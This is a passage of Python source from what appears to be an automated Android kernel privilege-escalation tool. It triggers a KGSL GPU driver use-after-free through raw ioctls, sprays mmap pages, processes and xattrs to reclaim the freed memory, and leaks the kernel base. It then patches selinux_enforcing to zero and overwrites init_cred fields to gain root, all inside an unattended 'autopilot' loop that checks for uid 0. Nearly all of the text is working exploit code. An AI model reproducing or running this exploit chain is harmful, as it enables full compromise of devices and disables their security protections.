            for off in range(0, 0x10000000, 0x200000):  # 32MB
                va = start + off
                if not self._engine_write(
                        f"read {hex(va)}\n".encode()):
                    continue
                data = self._read_data_packet()
                if not data or len(data) < 4096:
                    continue
                # Check ELF header
                if data[:4] == b"\x7fELF":
                    # Could be kernel base
                    self._kbase_candidates.append((va, 95, "ELF header"))
                    self.kernel_base = va
                    return (va, 95)
                # Check Linux version string
                if b"Linux version" in data:
                    self._kbase_candidates.append((va, 80, "version string"))
                    self.kernel_base = va
                    return (va, 80)
                # Check commit_creds / prepare_kernel_cred
                for sym in (b"commit_creds", b"prepare_kernel_cred"):
                    if sym in data:
                        self._kbase_candidates.append((va, 70, sym.decode()))
                        self.kernel_base = va
                        return (va, 70)
            return (None, 0)
        finally:
            self._kbase_search_active = False

    def _update_throughput(self):
        """Record current pages/sec into throughput_history (1Hz)."""
        import time as _t
        now = _t.time()
        if self._last_throughput_ts == 0.0:
            self._last_throughput_ts = now
            return
        elapsed = now - self._last_throughput_ts
        if elapsed < 1.0:
            return
        with self.stats_lock:
            current_pages = self.perf.get("pages_scanned", 0)
            delta = current_pages - self._last_pages_count
            pages_per_sec = delta / elapsed
            self.throughput_history[self.throughput_idx] = pages_per_sec
            self.throughput_idx = (self.throughput_idx + 1) % 60
            self.perf["last_scan_throughput"] = pages_per_sec
            # Cleanup old matches_window_ts (last hour only)
            hour_ago = now - 3600
            self.perf["matches_window_ts"] = [
                t for t in self.perf.get("matches_window_ts", [])
                if t > hour_ago]
            self.perf["matches_per_hour"] = len(
                self.perf["matches_window_ts"])
        self._last_throughput_ts = now
        self._last_pages_count = current_pages

    def _set_comm(self, name):
        """Set this process comm (visible in /proc/[pid]/comm) to `name`."""
        try:
            import ctypes
            libc = ctypes.CDLL(None)
            PR_SET_NAME = 15
            libc.prctl(PR_SET_NAME, name.encode(), 0, 0, 0)
        except Exception:
            pass

    def _setxattr_spray(self, marker):
        """Spray a kernel slab xattr with `marker` as the value.

        Uses Python's os.setxattr() wrapper (not raw ctypes syscall)
        because raw syscall(188) on Termux triggers SIGSYS due to
        the platform's seccomp filter and kills the whole process.
        os.setxattr() goes through libc which performs the same
        syscall but with proper errno handling — OSError on
        EPERM/EACCES instead of SIGSYS. The Python wrapper also
        adds the right architecture-specific header glue that
        ctypes.syscall(188) lacks (c_char_p arg vs c_int).

        Even with os.setxattr, on Termux the syscall MAY still
        be blocked by seccomp. We catch all OSError, ValueError,
        AttributeError so the spray loop never crashes. We also
        detect SIGSYS at process level by attempting one warm-up
        call in __init__ — if that process died we'd know, but
        the warm-up uses a tight try/except so we won't crash.

        Returns True if the xattr was successfully set, False
        otherwise (no count, no exception propagation).
        """
        import os as _os
        import tempfile
        try:
            # Tiny file in tempdir. Note: on Android some filesystems
            # don't support xattrs (sdcardfs, fuse). Use /data/local/tmp
            # or /dev/shm if available; fall back to TMPDIR.
            tmpdir = (_os.environ.get("TMPDIR")
                      or _os.environ.get("TEMP")
                      or "/data/local/tmp"
                      or tempfile.gettempdir())
            path = _os.path.join(tmpdir,
                                 f".kgsl_xspray_{_os.getpid()}_{marker}")
            try:
                with open(path, "wb") as _f:
                    _f.write(b"\x00" * 64)
            except Exception:
                return False
            val = marker.encode() + b"\x00" * 8
            # os.setxattr raises OSError on any failure. We catch
            # everything — no exception ever propagates.
            try:
                _os.setxattr(path, "user.kgslspray", val)
                return True
            except Exception:
                return False
            finally:
                try:
                    _os.unlink(path)
                except Exception:
                    pass
        except Exception:
            return False

    def _readline_timeout(self, timeout=2.0):
        """Non-blocking-ish read of one line from the engine (with select timeout).
        Returns:
            ""  -> timeout (no data available)
            None -> engine died / EOF
            str  -> the line read (already stripped)

        All engine I/O is serialized through self.engine_lock so
        that the autopilot and learning workers don't steal each
        other's responses."""
        with self.engine_lock:
            if not self.exploit_proc or self.exploit_proc.poll() is not None:
                return None
            try:
                fd = self.exploit_proc.stdout.fileno()
                r, _, _ = select.select([fd], [], [], timeout)
                if not r:
                    return ""
                line = self.exploit_proc.stdout.readline()
                if not line:
                    return None
                return line.decode(errors="ignore").strip()
            except Exception:
                return None

    # ============== AUTOPILOT MODE (full auto, no user input needed) ==============
    def cmd_autopilot_start(self):
        """Start the full autopilot: spray + scan + exploit + chain + verify.
        The user does not need to press any keys. Press P to pause, G to
        resume, X to fully stop."""
        if self.autopilot_thread and self.autopilot_thread.is_alive():
            self.live["last_msg"] = "Autopilot already running — P pause, G resume, X stop."
            return
        self.cancel_flag.clear()
        self.autopilot_paused = False
        self.autopilot_mode = True
        self.autopilot_thread = threading.Thread(target=self._autopilot_worker, daemon=True)
        self.autopilot_thread.start()
        self.live["last_msg"] = "AUTOPILOT ON — fully automatic, no input needed."
        self.log_event("autopilot_start", {})

    def cmd_autopilot_pause(self):
        self.autopilot_paused = True
        self.live["last_msg"] = "AUTOPILOT PAUSED. Press G to resume."

    def cmd_autopilot_resume(self):
        self.autopilot_paused = False
        self.live["last_msg"] = "AUTOPILOT RESUMED."

    def cmd_autopilot_stop(self):
        self.autopilot_mode = False
        self.autopilot_paused = False
        self.cancel_flag.set()
        self.live["last_msg"] = "AUTOPILOT STOPPED."

    def _python_mmap_spray(self, n_pages=4000, page_size=4096):
        """v4.1.11: mmap spray — the missing piece from v6.c.

        After triggering the UAF, the freed GPU page frames
        are returned to the page allocator. The task_struct
        slab allocator then picks them up for new task_struct
        allocations. To make this happen reliably, v6.c does
        a "mmap spray" right after the UAF:

          1. Allocate n_pages anonymous MAP_FIXED pages at
             0x100000000..+n_pages*page_size (above any
             normal mapping, in the lower 4GB to avoid
             64-bit issues).
          2. Write a sig pattern into each page (e.g. 1, 3,
             5, 7, 9) so corrupted pages are detectable.
          3. munmap them all. The free'd page frames now
             go back to the page allocator where the
             task_struct slab can pick them up.

        After mmap_spray, the freed GPU pages are MUCH more
        likely to be reused for task_structs. Then our
        process spray (KETO0422 + PID) fills the slab with
        detectable markers. The scanner finds them via the
        UAF dangling mapping.

        Returns the number of pages successfully sprayed.
        """
        import mmap as _mm
        import ctypes as _ct
        # Spray base: 0x100000000 (4GB). High enough to not
        # collide with typical user mappings, low enough for
        # 32-bit compatible mmap.
        SPRAY_BASE = 0x100000000
        total = n_pages * page_size
        if SPRAY_BASE + total > 0x7FFFFFFFFFFF:
            # Don't go past the user/kernel split (0x7fff... on
            # most 64-bit ARM64). Truncate.
            n_pages = (0x7FFFFFFFFFFF - SPRAY_BASE) // page_size
            total = n_pages * page_size
        sprayed = 0
        try:
            # Allocate one big mapping
            buf = _mm.mmap(SPRAY_BASE, total,
                           _mm.PROT_READ | _mm.PROT_WRITE,
                           _mm.MAP_PRIVATE | _mm.MAP_ANONYMOUS
                           | _mm.MAP_FIXED | _mm.MAP_NORESERVE,
                           -1, 0)
            if buf == _mm.MAP_FAILED:
                self.live["last_msg"] = (
                    f"mmap_spray: mmap({SPRAY_BASE:#x},"
                    f" {total:#x}) failed")
                return 0
            # Write sig pattern into each page (1, 3, 5, 7, 9
            # repeated). v6.c uses different sigs to make
            # corruption detectable. We use a different byte
            # per page.
            cbuf = (_ct.c_ubyte * total).from_address(SPRAY_BASE)
            for i in range(0, n_pages):
                cbuf[i * page_size] = (i % 5) * 2 + 1
                cbuf[i * page_size + page_size - 1] = 0xAB
            sprayed = n_pages
        except Exception as e:
            self.live["last_msg"] = f"mmap_spray: mmap err: {e}"
            return 0
        # v4.1.11: now munmap the whole range. The page
        # frames go back to the allocator where slab can
        # pick them up.
        try:
            _mm.munmap(SPRAY_BASE, total)
        except Exception as e:
            self.live["last_msg"] = f"mmap_spray: munmap err: {e}"
        return sprayed

    def _python_direct_uaf(self):
        """v4.1.10: trigger the KGSL UAF directly from Python,
        bypassing the engine subprocess. This is the same UAF
        that v6.c does in C, but using ctypes for the ioctl
        calls and mmap for the user mapping. The exploit chain:

        1. ioctl(KGSL_IOC_GPUOBJ_ALLOC, size=64MB) — allocate
           a GPU object in kernel memory.
        2. mmap(fd, UAF_START, MAP_FIXED) — map it to a
           user-space address.
        3. Touch each page (1 byte) so the page table is
           fully populated.
        4. ioctl(KGSL_IOC_GPUOBJ_FREE) — FREE the GPU object
           but the user mapping persists. This is the UAF.
        5. After this, anything that gets the freed physical
           page frame (task_struct allocations, etc.) can
           be read via the dangling mapping.

        Returns True on success, False on failure. Each ioctl
        call increments self.exploit_chain['ioctl_count'] so
        the user can see the count going up in the TUI.
        """
        import ctypes as _ct
        import mmap as _mm
        if self.kgsl_fd is None or self.kgsl_fd < 0:
            self.live["last_msg"] = "UAF: no kgsl_fd, cannot trigger"
            return False
        UAF_START  = 0x7001FF000
        UAF_SIZE   = 0x10004000  # 256MB + 16KB (matches v6.c)
        try:
            # 1. Allocate GPU object
            class _gpuobj_alloc(_ct.Structure):
                _fields_ = [
                    ("size", _ct.c_uint64),
                    ("flags", _ct.c_uint64),
                    ("va_len", _ct.c_uint64),
                    ("id", _ct.c_uint32),
                    ("_pad", _ct.c_uint32),
                    ("mmapsize", _ct.c_uint64),
                    ("gpuaddr", _ct.c_uint64),
                    ("_pad2", _ct.c_uint64 * 4),
                ]
            alloc = _gpuobj_alloc()
            alloc.size = UAF_SIZE
            alloc.flags = 0x10000000  # KGSL_MEMFLAGS_USE_CPU_MAP
            libc = _ct.CDLL(None, use_errno=True)
            r = libc.ioctl(self.kgsl_fd,
                           self.KGSL_IOC_GPUOBJ_ALLOC,
                           _ct.byref(alloc))
            self.exploit_chain["ioctl_count"] += 1
            if r < 0:
                e = _ct.get_errno()
                self.live["last_msg"] = (
                    f"UAF: GPUOBJ_ALLOC fail errno={e}: "
                    f"{os.strerror(e)}")
                return False
            uaf_id = alloc.id
            self.exploit_chain["uaf_triggered"] = True
            self.uaf_start = UAF_START
            self.uaf_id = uaf_id
            # 2. mmap to user space
            try:
                _mm.mmap(UAF_START, UAF_SIZE,
                         _mm.PROT_READ | _mm.PROT_WRITE,
                         _mm.MAP_SHARED | _mm.MAP_FIXED,
                         self.kgsl_fd, uaf_id << 12)
            except Exception as mm_e:
                self.live["last_msg"] = f"UAF: mmap fail: {mm_e}"
                return False
            # 3. Touch pages (1 byte each, fast like v6.c)
            try:
                import ctypes as _ct2
                buf = ( _ct2.c_char * UAF_SIZE).from_address(UAF_START)
                for i in range(0, UAF_SIZE, 4096):
                    buf[i] = b"\x01"
            except Exception as touch_e:
                # Touching may fault if the mmap didn't fully
                # populate — that's OK, the UAF is already
                # in place.
                pass
            # 4. Free GPU object (THE UAF!)
            class _gpuobj_free(_ct.Structure):
                _fields_ = [
                    ("id", _ct.c_uint32),
                    ("_pad", _ct.c_uint32),
                    ("flags", _ct.c_uint64),
                ]
            fr = _gpuobj_free()
            fr.id = uaf_id
            r = libc.ioctl(self.kgsl_fd,
                           self.KGSL_IOC_GPUOBJ_FREE,
                           _ct.byref(fr))
            self.exploit_chain["ioctl_count"] += 1
            if r < 0:
                e = _ct.get_errno()
                self.live["last_msg"] = (
                    f"UAF: GPUOBJ_FREE fail errno={e}: "
                    f"{os.strerror(e)}")
                return False
            self.live["last_msg"] = (
                f"UAF: triggered id={uaf_id} VA=0x{UAF_START:x} "
                f"size=0x{UAF_SIZE:x} (ioctl={self.exploit_chain['ioctl_count']})")
            self.log_event("uaf_triggered",
                           {"id": uaf_id, "va": hex(UAF_START),
                            "size": UAF_SIZE})
            return True
        except Exception as e:
            self.live["last_msg"] = f"UAF: exception: {e}"
            self.log_event("uaf_exception", {"err": str(e)})
            return False

    def _auto_kbase_leak(self):
        """v4.1.22: try to leak kernel base via /proc/PID/stat.

        Iterates over live spray procs and parses their
        /proc/PID/stat field 27 (start_code) which is
        sometimes a kernel address even with
        kptr_restrict=2. Returns the first kernel-looking
        address found, or 0 if none.
        """
        my_pids = set()
        for s in self.spray_procs_by_worker.values():
            my_pids.update(s)
        for pid in list(my_pids)[:30]:
            try:
                with open(f"/proc/{pid}/stat") as f:
                    content = f.read()
                p1 = content.find(")")
                if p1 < 0:
                    continue
                rest = content[p1+1:].split()
                if len(rest) >= 27:
                    sc = int(rest[25])
                    if 0xffffff8000000000 <= sc <= 0xffffffffffffffff:
                        return sc
            except Exception:
                pass
        return 0

    def _auto_readback_test(self):
        """v4.1.22: write known pattern to user mmap, ask
        engine to read it. Returns True if write succeeded
        (the engine response is logged to /sdcard/kgsl_eng.log).
        """
        try:
            import mmap as _mmap
            test_buf = _mmap.mmap(
                -1, 0x1000,
                prot=_mmap.PROT_READ | _mmap.PROT_WRITE,
                flags=_mmap.MAP_PRIVATE | _mmap.MAP_ANONYMOUS)
            marker = f"RB_{os.getpid()}_{os.urandom(4).hex()}_".encode()
            marker = (marker + b"\x00" * 64)[:64]
            test_buf[:len(marker)] = marker
            # find a writable user address
            test_addr = 0
            with open("/proc/self/maps") as f:
                for line in f:
                    if "rw" in line:
                        addr = line.split()[0]
                        if "-" in addr:
                            test_addr = int(addr.split("-")[0], 16)
                            break
            if test_addr == 0:
                test_buf.close()
                return False
            import ctypes
            ctypes.memset(test_addr, 0, 256)
            ctypes.memmove(test_addr, marker, len(marker))
            ok = self._engine_write(
                f"read {hex(test_addr)}\n".encode())
            test_buf.close()
            return ok
        except Exception:
            return False

    def _autopilot_worker(self):
        """Fully autonomous exploit + learn + verify loop.
        Cycles:  UAF → kbase → selinux → cred → patch → verify → repeat.
        Runs forever until user pauses (P) or stops (X) or engine dies.

        Verticalized: each cycle also kicks the parallel learning
        workers (already running). When the learning workers discover
        kbase / selinux / cred we use those addresses; otherwise the
        cycle's own _run_exploit_pipeline tries to find them.

        v4.1.10: direct Python UAF trigger bypasses engine subprocess
        for the critical first ioctl calls. The engine has been
        failing to make ioctls (TUI showed ioctl=0 even with
        kgsl=ON), so we now call ioctl directly from Python via
        ctypes. The Python side already has kgsl_fd set. This
        triggers the UAF reliably, then we tell the engine to
        scan.

        Cooldown is 2s (was 5s) so that we re-exploit + re-scan
        aggressively — KGSL UAF pages get recycled quickly and we
        want fresh task_structs each time.
        """
        cycle = 0  # v4.1.23: restored, was lost in earlier edit
        # v4.1.18: try to auto-build spray_helper if missing
        self._ensure_spray_helper()
        # Short cooldown — the engine and learning workers are
        # already doing their thing in parallel, so each cycle
        # should be quick.
        cooldown = 2
        self.live["status"] = "AUTOPILOT"
        while self.autopilot_mode and not self.cancel_flag.is_set():
            # Respect pause
            while self.autopilot_paused and self.autopilot_mode and not self.cancel_flag.is_set():
                self.live["status"] = "AUTOPILOT (paused)"
                time.sleep(0.5)
            if not self.autopilot_mode or self.cancel_flag.is_set():
                break
            self.live["status"] = "AUTOPILOT"
            cycle += 1
            # v4.1.18: auto-diagnostic every 30 cycles
            if cycle % 30 == 0:
                try:
                    with open("/sdcard/kgsl_auto.log", "a") as f:
                        f.write(f"\n--- cycle {cycle} ---\n")
                        my_pids = set()
                        for s in self.spray_procs_by_worker.values():
                            my_pids.update(s)
                        keto_ok = 0
                        for pid in list(my_pids)[:10]:
                            try:
                                with open(f"/proc/{pid}/comm") as cf:
                                    c = cf.read().strip()
                                if "KETO" in c or "KETW" in c:
                                    keto_ok += 1
                            except Exception:
                                pass
                        f.write(
                            f"sprayP={self.live.get('spray_count', 0)} "
                            f"alive={len(my_pids)} "
                            f"vcomm={keto_ok}/10 have KETO "
                            f"ioctl={self.live.get('ioctl_count', 0)}\n")
                except Exception:
                    pass
            self.live["last_msg"] = f"AUTO cycle {cycle}: starting…"
            try:
                # Make sure engine is alive
                if not self.ensure_engine():
                    self.live["last_msg"] = "AUTO: engine not available, retrying…"
                    time.sleep(5)
                    continue
                # Start the AI learning (spray+scan) in background so it
                # runs in parallel with the exploit pipeline.
                if not (self.bg_thread and self.bg_thread.is_alive()):
                    self.cmd_learning_start()
                # v4.1.22: AUTOMATIC kernel base leak attempt.
                # Every 20 cycles, try to leak kernel base via
                # /proc/PID/stat field 27 (start_code). If we
                # find it, the WIDE scan range will be
                # narrowed to a real target. Without this, the
                # WIDE scan is just blind searching 1GB of
                # kernel VA hoping to hit task_structs.
                if cycle % 20 == 0 and self.kernel_base == 0:
                    try:
                        leaked = self._auto_kbase_leak()
                        if leaked > 0:
                            self.kernel_base = leaked
                            self.live["last_msg"] = (
                                f"AUTO: kernel base leaked "
                                f"0x{leaked:x} (cycle {cycle})")
                    except Exception:
                        pass
                # v4.1.22: AUTOMATIC readback test every 100
                # cycles. Writes a known pattern to user mmap,
                # asks the engine to read it, and logs the
                # result to /sdcard/kgsl_eng.log. If the
                # engine can't read user mmap, it definitely
                # can't read kernel VA. This is the "is the
                # engine even alive" check.
                if cycle % 100 == 0:
                    try:
                        ok = self._auto_readback_test()
                        with open("/sdcard/kgsl_auto.log", "a") as f:
                            f.write(
                                f"cycle {cycle}: readback="
                                f"{'OK' if ok else 'FAIL'}\n")
                    except Exception:
                        pass
                # v4.1.10: BEFORE the engine-driven pipeline, do
                # a direct Python UAF trigger. This calls ioctl
                # from Python via ctypes — no engine subprocess
                # needed. Increments ioctl_count in the TUI so
                # user can see KGSL ioctls are actually happening.
                if self.kgsl_fd is not None:
                    uaf_ok = self._python_direct_uaf()
                    if uaf_ok:
                        self.exploit_chain["uaf_triggered"] = True
                        # v4.1.11: mmap_spray IMMEDIATELY after
                        # UAF. v6.c does 4000 MAP_FIXED pages to
                        # force the freed GPU page frames back
                        # into the slab allocator where
                        # task_struct can land on them. Without
                        # this, the freed pages sit unused and
                        # our UAF VA never has anything in it.
                        n_sprayed = self._python_mmap_spray(
                            n_pages=4000)
                        # v4.1.11: kick the AI learning workers
                        # NOW to spray KETO0422 procs which will
                        # claim the just-freed page frames for
                        # their task_struct allocations. We
                        # wait briefly to let them spawn.
                        if hasattr(self, "cmd_spray") and \
                                callable(self.cmd_spray):
                            self.cmd_spray(batch=20)
                            time.sleep(0.2)
                        if n_sprayed > 0:
                            self.live["last_msg"] = (
                                f"AUTO: UAF + mmap_spray "
                                f"{n_sprayed}pg + spray 20 "
                                f"(cycle {cycle})")
                        else:
                            self.live["last_msg"] = (
                                f"AUTO: UAF triggered but "
                                f"mmap_spray failed "
                                f"(cycle {cycle})")
                        # v4.1.11: now scan the UAF range
                        # directly (256MB, not 1GB WIDE). This
                        # is the moment of truth — if the spray
                        # reclaimed our freed pages, the scan
                        # will find KETO0422 markers.
                        if hasattr(self, "cmd_scan") and \
                                callable(self.cmd_scan):
                            self.cmd_scan()
                # Run the full exploit pipeline (E — kbase → selinux → cred → patch)
                self._run_exploit_pipeline()
            except Exception as e:
                self.live["last_msg"] = f"AUTO error: {e}"
                self.log_event("autopilot_error", {"cycle": cycle, "err": str(e)})
            # After the pipeline, also try to walk cred chains from any
            # found task_structs (in case _find_init_cred missed).
            try:
                self._autopilot_walk_creds()
            except Exception as e:
                self.live["last_msg"] = f"AUTO walk error: {e}"
            # Also do a targeted scan around kbase to find more
            # SELinux / init_cred / task_struct hits. The learning
            # workers do broad scans; this one is narrow + quick.
            try:
                if self.kernel_base:
                    self._autopilot_scan_around_kbase()
            except Exception as e:
                self.live["last_msg"] = f"AUTO scan error: {e}"
            # Verify root (uid=0)
            try:
                self._autopilot_verify_root()
            except Exception as e:
                self.live["last_msg"] = f"AUTO verify error: {e}"
            # Cooldown
            for _ in range(cooldown):
                if not self.autopilot_mode or self.cancel_flag.is_set():
                    break
                if not self.autopilot_paused:
                    time.sleep(1)
        self.live["status"] = "IDLE"
        self.live["last_msg"] = f"Autopilot stopped after {cycle} cycles."
        self.log_event("autopilot_stop", {"cycles": cycle})

    def _autopilot_walk_creds(self):
        """After each cycle, walk cred chains from any found task_struct
        that has a cred pointer (sig 6). If we find a root cred, patch it.
        Done OUTSIDE the normal _run_exploit_pipeline so it's always tried."""
        with self.bg_lock:
            ts_items = [it for it in self.found_items
                        if it.get('type') in ("Privilege Struct",)
                        and 'cred @' in it.get('description', '').lower()
                        and 'task_struct' in it.get('description', '').lower()]
        for it in ts_items[:5]:
            try:
                ts_va = int(it['va'], 16)
            except Exception:
                continue
            if not ts_va:
                continue
            for off in (0x770, 0x768, 0x778, 0x780):
                if self.cred_va:
                    return
                chain = self.walk_cred_chain(ts_va, off_in_page=off, max_hops=3)
                if not chain:
                    continue
                for step_idx, (tgt, page, desc) in enumerate(chain):
                    if "ROOT" in desc:
                        self.cred_va = tgt
                        self.live["last_msg"] = (
                            f"AUTO: ROOT cred @ {tgt:#x} via chain walk")
                        for f_off in (4, 8, 12, 16, 20, 24):
                            self.patch_mem(tgt + f_off, 0)
                        self._add_found(
                            va=hex(tgt),
                            type="Privilege Struct (ROOTED)",
                            desc="init_cred-like (autopilot chain walk, patched)",
                            confidence=100,
                        )
                        return

    def _autopilot_scan_around_kbase(self):
        """Once kbase is known, scan the region around it looking for
        SELinux / init_cred / task_struct hits. Uses the engine's "S"
        command, but with a smaller sub-range so each cycle completes
        quickly. Only fires if kbase is set."""
        if not self.kernel_base:
            return
        if self.op_busy.get("scan", False):
            return  # don't queue if a scan is already running
        if not self.ensure_engine():
            return
        # 8 MB window around kbase — covers the SELinux / init_cred area
        # in a typical Android 5.4 kernel.
        s_start = (self.kernel_base + 0x1000000) & ~0xFFFFF
        s_end   = s_start + 0x800000
        if not self._engine_write(
                f"scan {hex(s_start)} {hex(s_end)}\n".encode()):
            return
        with self.bg_lock:
            self.live["scan_total"]  = s_end - s_start
            self.live["scan_offset"] = s_start
            self.live["last_msg"] = (
                f"AUTO: targeted scan around kbase 0x{self.kernel_base:x}…")
        # Drive the scan with a short timeout. We don't bother to
        # fully process every line — the learning workers do that in
        # parallel. We just want to surface high-sig hits.
        deadline = time.time() + 15.0
        idle_count = 0
        while time.time() < deadline and not self.cancel_flag.is_set():
            line = self._readline_timeout(timeout=0.5)
            if line is None:
                break
            if not line:
                idle_count += 1
                if idle_count > 30:
                    break
                continue
            idle_count = 0
            if "SCAN_DONE" in line:
                try:
                    stats_part = line.split("SCAN_DONE", 1)[1]
                    kv = {}
                    for part in stats_part.split(":"):
                        if "=" in part:
                            k, v = part.split("=", 1)
                            kv[k] = v
                    reads   = int(kv.get("r", "0"))
                    failed  = int(kv.get("f", "0"))
                    empty   = int(kv.get("e", "0"))
                    nonzero = int(kv.get("n", "0"))
                    hits    = int(kv.get("h", "0"))
                    self.live["last_msg"] = (
                        f"AUTO: scan done r={reads} f={failed} e={empty} "
                        f"n={nonzero} h={hits}")
                except Exception:
                    pass
                break
            if "PROGRESS:" in line:
                try:
                    self.live["scan_offset"] = int(line.split(":")[1], 16)
                except Exception:
                    pass
                continue
            if "MATCH:" in line:
                try:
                    parts = line.split(":")
                    va = int(parts[1], 16)
                    sig = int(parts[2])
                    off_in_page = int(parts[3]) if len(parts) > 3 else -1
                except Exception:
                    continue
                self.live["scan_offset"] = va
                data = self._read_data_packet()
                if not data:
                    continue
                already = any(int(it['va'], 16) == va
                             for it in self.found_items)
                if already:
                    continue
                if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17):
                    with self.bg_lock:
                        self.found_items.append(
                            self.classify_page(data, va, sig, off_in_page))
                    self.log_event("autopilot_scan_match",
                                   {"va": va, "sig": sig})
        with self.bg_lock:
            self.live["scan_total"] = 0
            self.live["last_msg"] = (
                f"AUTO: targeted scan done "
                f"({len([i for i in self.found_items if 'KGSL' in str(i)])} items)")

    def _autopilot_verify_root(self):
        """Run `id` and parse the uid. Update live state.
        If uid==0, set self.root_verified=True."""
        try:
            out = subprocess.check_output(["id"], text=True, timeout=2)
        except Exception:
            return
        # Format: "uid=0(root) gid=0(root) groups=..."
        m = re.search(r"uid=(\d+)\(([^)]+)\)", out)
        if m:
            uid = int(m.group(1))
            name = m.group(2)
            self.live["uid"] = uid
            self.live["user"] = name
            if uid == 0:
                self.root_verified = True
                self.live["last_msg"] = f"AUTO: ROOT VERIFIED (uid={uid} {name})"
                self.log_event("root_verified", {"uid": uid, "name": name})
            else:
                self.root_verified = False

    # ============== WATCH MODE (continuous auto-exploit) ==============
    def cmd_watch_start(self):
        """Auto-re-run the exploit pipeline continuously in a background thread.
        Each cycle: UAF → kbase → selinux → cred → patch. Stops when watch_mode
        is cleared or Ctrl+P is pressed."""
        self.live["last_command"] = "WATCH"
        if self.watch_mode and self.watch_thread and self.watch_thread.is_alive():
            self.live["last_msg"] = "Watch mode already running — Ctrl+P to stop."
            return
        self.cancel_flag.clear()
        self.watch_mode = True
        self.watch_thread = threading.Thread(target=self._watch_worker, daemon=True)
        self.watch_thread.start()
        self.live["last_msg"] = "Watch mode started. Pipeline will auto-repeat."
        self.log_event("watch_start", {})

    def cmd_watch_stop(self):
        self.watch_mode = False
        self.cancel_flag.set()
        self.live["last_msg"] = "Watch mode stopped."

    def _watch_worker(self):
        """Continuous exploit pipeline. Re-runs every 30s, or sooner if
        previous run failed. Updates TUI live status so user sees progress
        without pressing keys."""
        cycle = 0
        while self.watch_mode and not self.cancel_flag.is_set():
            cycle += 1
            self.live["last_msg"] = f"WATCH cycle {cycle}: UAF + chain…"
            try:
                # 1. Ensure engine is up
                if not self.ensure_engine():
                    self.live["last_msg"] = "WATCH: engine not available, retrying in 10s…"
                    time.sleep(10)
                    continue
                # 2. Run the exploit (will chain to kbase/selinux/cred/patch)
                self._run_exploit_pipeline()
            except Exception as e:
                self.live["last_msg"] = f"WATCH error: {e}"
                self.log_event("watch_error", {"err": str(e)})
            # 3. Sleep between cycles
            for _ in range(30):
                if not self.watch_mode or self.cancel_flag.is_set():
                    break
                time.sleep(1)
        self.live["last_msg"] = f"Watch mode stopped after {cycle} cycles."
        self.log_event("watch_stop", {"cycles": cycle})

    def _run_exploit_pipeline(self):
        """Replicate the auto-pipeline from trigger_exploit but as a callable."""
        # This is a synchronous pipeline (called by watch worker or
        # trigger_exploit's worker). It does NOT spawn a new thread.
        self.op_busy["exploit"] = True
        try:
            if not self._engine_write(b"exploit\n"):
                self.live["last_msg"] = "Engine write failed"
                return
            # Wait for UAF_READY / UAF_FAILED — with a deadline so
            # we don't hang forever if the learning worker is also
            # holding the engine_lock for a long scan.
            deadline = time.time() + 30
            idle_count = 0
            while time.time() < deadline:
                line = self._readline_timeout(timeout=0.5)
                if line is None:
                    break
                if not line:
                    idle_count += 1
                    if idle_count % 20 == 0:
                        self.live["last_msg"] = (
                            f"AUTO: waiting for UAF_READY… "
                            f"({int(deadline - time.time())}s left)")
                    continue
                idle_count = 0
                if "UAF_READY" in line or "UAF_FAILED" in line:
                    if "UAF_FAILED" in line:
                        self.live["last_msg"] = f"WATCH: {line}"
                    break
            else:
                self.live["last_msg"] = "WATCH: UAF timeout"
                return
            if "UAF_READY" not in (line or ""):
                return
            # Find kbase
            self.live["last_msg"] = "WATCH: finding kernel base…"
            kbase = self._find_kernel_base()
            if not kbase:
                self.live["last_msg"] = "WATCH: no kbase"
                return
            self.kernel_base = kbase
            # Probe SELinux
            self.live["last_msg"] = "WATCH: probing SELinux…"
            sel = self._probe_selinux(kbase)
            if sel:
                self.selinux_va, val = sel
                self.patch_mem(self.selinux_va, 0)
            # Find init_cred
            self.live["last_msg"] = "WATCH: finding init_cred…"
            ic = self._find_init_cred(kbase)
            if ic:
                self.cred_va = ic
                for off in (4, 8, 12, 16, 20, 24):
                    self.patch_mem(self.cred_va + off, 0)
            self.live["last_msg"] = (f"WATCH: kbase=0x{kbase:x} "
                                    f"selinux={'0x%x'%self.selinux_va if self.selinux_va else 'N/A'} "
                                    f"cred={'0x%x'%self.cred_va if self.cred_va else 'N/A'}")
        finally:
            self.op_busy["exploit"] = False

    # ============== ACTIONS ==============
    def trigger_exploit(self):
        """Trigger the KGSL UAF. In auto_mode, also chains: kbase → selinux → cred → patch.
        Runs in a worker thread so the TUI never freezes."""
        self.live["last_command"] = "E (Exploit)"
        if self.op_busy["exploit"]:
            self.live["last_msg"] = "Exploit already running…"
            return "Busy"
        if not self._engine_write(b"exploit\n"):
            return "Engine Error"

        self.op_busy["exploit"] = True
        self.live["last_msg"] = "EXPLOITING…"

        def _worker():
            try:
                # Poll the engine for "UAF_READY" / "UAF_FAILED"
                deadline = time.time() + 30
                last_line = ""
                idle_count = 0
                while time.time() < deadline:
                    line = self._readline_timeout(timeout=0.5)
                    if line is None:
                        self.op_results["exploit"] = "Engine died during exploit"
                        break
                    if not line:
                        idle_count += 1
                        if idle_count % 20 == 0:
                            self.live["last_msg"] = (
                                f"EXPLOIT: waiting for UAF_READY… "
                                f"({int(deadline - time.time())}s left)")
                        continue
                    idle_count = 0
                    last_line = line
                    if "UAF_READY" in line or "UAF_FAILED" in line:
                        self.op_results["exploit"] = line
                        break
                else:
                    self.op_results["exploit"] = f"Exploit timeout: {last_line or 'no response'}"
                self.live["last_msg"] = f"Exploit: {self.op_results['exploit']}"
                self.log_event("exploit", {"result": self.op_results['exploit']})

                if "UAF_READY" not in (self.op_results["exploit"] or ""):
                    return

                # Auto-mode: chain through kbase → selinux → cred → patch
                if not self.auto_mode:
                    return

                self.live["last_msg"] = "AUTO: finding kernel base…"
                kbase = self._find_kernel_base()
                if kbase is None:
                    self.live["last_msg"] = "AUTO: kernel base not found"
                    self.log_event("auto_kbase_fail", {})
                    return
                self.kernel_base = kbase
                self.log_event("auto_kbase", {"kbase": hex(kbase)})
                self._add_found(
                    va=hex(kbase),
                    type="Kernel Code",
                    desc="Kernel ELF base (auto)",
                    confidence=100,
                )

                self.live["last_msg"] = f"AUTO: kernel base=0x{kbase:x}, probing SELinux…"
                sel = self._probe_selinux(kbase)
                if sel is not None:
                    sel_va, val = sel
                    self.selinux_va = sel_va
                    self.log_event("auto_selinux", {"va": hex(sel_va), "val": val})
                    self._add_found(
                        va=hex(sel_va),
                        type="SELinux",
                        desc=f"selinux_enforcing={val} (verified stable)",
                        confidence=100,
                    )
                    # Patch SELinux enforcing -> 0 (disable)
